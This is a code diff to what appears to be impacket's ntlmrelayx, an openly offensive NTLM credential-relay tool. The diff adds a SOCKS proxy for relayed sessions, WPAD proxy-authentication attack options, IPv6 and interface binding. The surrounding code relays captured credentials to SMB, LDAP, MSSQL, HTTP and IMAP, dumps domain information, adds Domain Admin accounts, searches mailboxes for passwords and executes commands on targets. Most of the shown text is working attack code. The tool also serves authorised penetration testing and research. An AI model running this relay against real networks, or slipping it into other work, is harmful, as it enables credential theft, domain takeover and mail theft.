@@ -13,25 +13,26 @@
 #
 # Description:
 #             This module performs the SMB Relay attacks originally discovered
-# by cDc. It receives a list of targets and for every connection received it 
+# by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
+# It receives a list of targets and for every connection received it
 # will choose the next target and try to relay the credentials. Also, if
-# specified, it will first to try authenticate against the client connecting 
+# specified, it will first to try authenticate against the client connecting
 # to us.
-# 
-# It is implemented by invoking a SMB and HTTP Server, hooking to a few 
-# functions and then using the smbclient portion. It is supposed to be 
-# working on any LM Compatibility level. The only way to stop this attack 
-# is to enforce on the server SPN checks and or signing.
-# 
+#
+# It is implemented by invoking a SMB and HTTP Server, hooking to a few
+# functions and then using the specific protocol clients (e.g. SMB, LDAP).
+# It is supposed to be working on any LM Compatibility level. The only way
+# to stop this attack is to enforce on the server SPN checks and or signing.
+#
 # If the target system is enforcing signing and a machine account was provided,
-# the module will try to gather the SMB session key through 
+# the module will try to gather the SMB session key through
 # NETLOGON (CVE-2015-0005)
 #
-# If the authentication against the targets succeed, the client authentication 
-# success as well and a valid connection is set against the local smbserver. 
-# It's up to the user to set up the local smbserver functionality. One option 
-# is to set up shares with whatever files you want to the victim thinks it's 
-# connected to a valid SMB server. All that is done through the smb.conf file or 
+# If the authentication against the targets succeed, the client authentication
+# success as well and a valid connection is set against the local smbserver.
+# It's up to the user to set up the local smbserver functionality. One option
+# is to set up shares with whatever files you want to the victim thinks it's
+# connected to a valid SMB server. All that is done through the smb.conf file or
 # programmatically.
 #
 
@@ -52,6 +53,7 @@ from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
+from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 from impacket.smbconnection import SMBConnection
 from smbclient import MiniImpacketShell
 
@@ -215,7 +217,7 @@ class LDAPAttack(Thread):
             logging.info('User is not a Domain Admin')
             if not dumpedDomain and self.config.dumpdomain:
                 #do this before the dump is complete because of the time this can take
-                dumpedDomain = True 
+                dumpedDomain = True
                 logging.info('Dumping domain info for first time')
                 domainDumper.domainDump()
                 logging.info('Domain info dumped into lootdir!')
@@ -233,7 +235,7 @@ class HTTPAttack(Thread):
         #Default action: Dump requested page to file, named username-targetname.html
 
         #You can also request any page on the server via self.client.session,
-        #for example with: 
+        #for example with:
         #result = self.client.session.get('http://secretserver/secretpage.html')
         #print result.content
 
@@ -336,6 +338,8 @@ class MSSQLAttack(Thread):
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
+#    RELAY_SERVERS = ( SMBRelayServer, SMBRelayServer )
+
     ATTACKS = { 'SMB': SMBAttack, 'LDAP': LDAPAttack, 'HTTP': HTTPAttack, 'MSSQL': MSSQLAttack, 'IMAP': IMAPAttack}
     # Init the example's logger theme
     logger.init()
@@ -347,6 +351,7 @@ if __name__ == '__main__':
 
     #Main arguments
     parser.add_argument("-h","--help", action="help", help='show this help message and exit')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-t',"--target", action='store', metavar = 'TARGET', help='Target to relay the credentials to, '
                   'can be an IP, hostname or URL like smb://server:445 If unspecified, it will relay back to the client')
     parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
@@ -355,7 +360,11 @@ if __name__ == '__main__':
                                                         'automatically (only valid with -tf)')
     parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient/mssqlclient console instead'
                         'of executing a command after a successful relay. This console will listen locally on a '
-                        ' tcp port and can be reached with for example netcat.')    
+                        ' tcp port and can be reached with for example netcat.')
+    # Interface address specification
+    parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
+                  'bind SMB and HTTP servers',default='')
+
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
@@ -371,6 +380,13 @@ if __name__ == '__main__':
                         'interacting with the domain to grab a session key for signing, format is domain/machine_name')
     parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
+    parser.add_argument('-socks', action='store_true', default=False,
+                        help='Launch a SOCKS proxy for the connection relayed')
+    parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
+                                                                   'setting the proxy host to the one supplied.')
+    parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
+                                                                   'before serving a WPAD file.')
+    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
@@ -384,22 +400,22 @@ if __name__ == '__main__':
     mssqloptions = parser.add_argument_group("MSSQL client options")
     mssqloptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
                         '(can specify multiple)')
-    
+
     #HTTP options (not in use for now)
     # httpoptions = parser.add_argument_group("HTTP client options")
     # httpoptions.add_argument('-q','--query', action='append', required=False, metavar = 'QUERY', help='MSSQL query to execute'
-    #                     '(can specify multiple)')   
+    #                     '(can specify multiple)')
 
     #LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
-    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information') 
-    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin') 
+    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
+    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
 
-    #IMAP options 
+    #IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
     imapoptions.add_argument('-k','--keyword', action='store', metavar="KEYWORD", required=False, default="password", help='IMAP keyword to search for. '
                         'If not specified, will search for mails containing "password"')
-    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX') 
+    imapoptions.add_argument('-m','--mailbox', action='store', metavar="MAILBOX", required=False, default="INBOX", help='Mailbox name to dump. Default: INBOX')
     imapoptions.add_argument('-a','--all', action='store_true', required=False, help='Instead of searching for keywords, '
                         'dump all emails')
     imapoptions.add_argument('-im','--imap-max', action='store',type=int, required=False,default=0, help='Max number of emails to dump '
@@ -410,6 +426,12 @@ if __name__ == '__main__':
     except Exception, e:
        logging.error(str(e))
        sys.exit(1)
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
 
     if options.codec is not None:
         codec = options.codec
@@ -438,9 +460,17 @@ if __name__ == '__main__':
         watchthread = TargetsFileWatcher(targetSystem)
         watchthread.start()
 
+    if options.socks is True:
+        # Start a SOCKS proxy in the background
+        s = SOCKS()
+        socks_thread = Thread(target=s.serve_forever)
+        socks_thread.daemon = True
+        socks_thread.start()
+
     for server in RELAY_SERVERS:
         #Set up config
         c = NTLMRelayxConfig()
+        c.setRunSocks(options.socks)
         c.setTargets(targetSystem)
         c.setExeFile(options.e)
         c.setCommand(options.c)
@@ -453,6 +483,9 @@ if __name__ == '__main__':
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
         c.setIMAPOptions(options.keyword,options.mailbox,options.all,options.imap_max)
+        c.setIPv6(options.ipv6)
+        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
+        c.setInterfaceIp(options.interface_ip)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
@@ -472,7 +505,7 @@ if __name__ == '__main__':
 
         s = server(c)
         s.start()
-        
+
     print ""
     logging.info("Servers started, waiting for connections")
     while True:
